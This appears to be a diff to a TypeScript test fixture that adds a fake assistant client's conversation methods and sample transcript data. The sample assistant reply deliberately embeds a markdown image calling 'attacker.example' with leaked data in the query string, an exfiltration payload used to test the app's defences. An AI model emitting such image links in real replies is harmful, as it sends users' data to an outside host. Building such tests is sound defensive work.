@@ -11,7 +11,14 @@ import type {
   CreateResult,
   NetWorth,
 } from '../src/assets-client';
-import type { AnalysisName, AnalysisView, AssistantClient } from '../src/assistant-client';
+import type {
+  AnalysisName,
+  AnalysisView,
+  AssistantClient,
+  Conversation,
+  Transcript,
+  Turn,
+} from '../src/assistant-client';
 import type { BffConfig } from '../src/config';
 import type {
   IdentityClient,
@@ -223,7 +230,88 @@ export class FakeAssistantClient implements AssistantClient {
     this.consentsResult = this.consentsResult.filter((granted) => granted !== scope);
     return Promise.resolve(this.consentsResult);
   }
+
+  // ---- the conversation surface (M11) --------------------------------------
+
+  conversationsCalls: string[] = [];
+  transcriptCalls: Array<{ accessToken: string; conversationId: string }> = [];
+  startCalls: string[] = [];
+  sendCalls: Array<{ accessToken: string; conversationId: string; text: string }> = [];
+  deleteCalls: Array<{ accessToken: string; conversationId: string }> = [];
+
+  conversationsResult: Conversation[] = [CONVERSATION];
+  transcriptResult: Transcript = TRANSCRIPT;
+  turnResult: Turn = TURN;
+  conversationError: Error | null = null;
+
+  conversations(accessToken: string): Promise<Conversation[]> {
+    this.conversationsCalls.push(accessToken);
+    return this.reject() ?? Promise.resolve(this.conversationsResult);
+  }
+
+  transcript(accessToken: string, conversationId: string): Promise<Transcript> {
+    this.transcriptCalls.push({ accessToken, conversationId });
+    return this.reject() ?? Promise.resolve(this.transcriptResult);
+  }
+
+  startConversation(accessToken: string): Promise<Conversation> {
+    this.startCalls.push(accessToken);
+    return this.reject() ?? Promise.resolve(CONVERSATION);
+  }
+
+  sendMessage(accessToken: string, conversationId: string, text: string): Promise<Turn> {
+    this.sendCalls.push({ accessToken, conversationId, text });
+    return this.reject() ?? Promise.resolve(this.turnResult);
+  }
+
+  deleteConversation(accessToken: string, conversationId: string): Promise<void> {
+    this.deleteCalls.push({ accessToken, conversationId });
+    return this.reject() ?? Promise.resolve();
+  }
+
+  /** One place to inject a downstream failure across the conversation surface. */
+  private reject<T>(): Promise<T> | null {
+    return this.conversationError === null ? null : Promise.reject(this.conversationError);
+  }
 }
+
+export const CONVERSATION: Conversation = {
+  conversationId: 'c0nv0000-0000-4000-8000-00000000000c',
+  createdAt: '2026-08-05T10:00:00.000Z',
+  updatedAt: '2026-08-05T10:05:00.000Z',
+};
+
+/**
+ * A transcript carrying an EXFILTRATION PAYLOAD as the assistant's text, so the
+ * tests downstream of here are exercising the case docs/03 §6d cares about
+ * rather than a friendly sentence.
+ */
+export const TRANSCRIPT: Transcript = {
+  conversationId: CONVERSATION.conversationId,
+  messages: [
+    {
+      messageId: 'm0000000-0000-4000-8000-000000000001',
+      seq: 0,
+      role: 'user',
+      text: 'what do I own?',
+      createdAt: '2026-08-05T10:00:00.000Z',
+    },
+    {
+      messageId: 'm0000000-0000-4000-8000-000000000002',
+      seq: 1,
+      role: 'assistant',
+      text: 'You have one property. ![](https://attacker.example/?d=leak)',
+      createdAt: '2026-08-05T10:00:05.000Z',
+    },
+  ],
+};
+
+export const TURN: Turn = {
+  conversationId: CONVERSATION.conversationId,
+  messageId: 'm0000000-0000-4000-8000-000000000003',
+  text: 'Your estate looks in order.',
+  toolCalls: 1,
+};
 
 export interface TestAppOptions {
   config?: BffConfig;
